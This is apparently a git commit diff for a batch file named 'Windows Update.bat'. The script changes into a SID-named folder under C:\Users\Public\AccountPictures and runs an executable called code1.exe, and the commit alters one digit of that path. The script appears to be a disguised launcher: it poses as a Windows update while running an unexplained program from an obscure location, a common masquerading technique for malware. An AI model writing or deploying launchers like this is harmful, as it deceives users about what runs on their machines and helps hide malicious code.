75dc98de424d0dd59d2d598d8e384b1f74d1918d
wisnia7777 <wisniawisniawisnia2@gmail.com>
2025-02-27 15:20:12 +0100

    Add files via upload

--- Windows Update.bat
+++ Windows Update.bat
@@ -1,3 +1,3 @@
 @echo off
-cd C:\Users\Public\AccountPictures\S-1-5-21-1444420733-4045720388-1441969103-1002
+cd C:\Users\Public\AccountPictures\S-1-5-21-1444420733-5045720388-1441969103-1002
 .\code1.exe
